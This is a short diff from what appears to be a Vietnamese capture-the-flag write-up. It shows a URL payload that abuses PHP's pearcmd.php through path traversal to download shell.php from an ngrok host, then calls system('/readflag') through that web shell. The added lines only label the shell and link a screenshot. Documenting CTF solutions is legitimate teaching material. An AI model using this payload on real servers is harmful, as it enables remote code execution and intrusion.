@@ -9,6 +9,10 @@ payload:
 /?+install+--force+--installroot+/tmp/wtf+https://1fb5-101-99-36-202.ap.ngrok.io/shell.php+?&page=../../../../usr/local/lib/php/pearcmd.php
 ```
 
+shell.php
+
+![shell](https://user-images.githubusercontent.com/77546253/172332527-38fac478-343c-4989-a408-0e229928f70a.png)
+
 sau đó: `0=system('/readflag');`
 
 
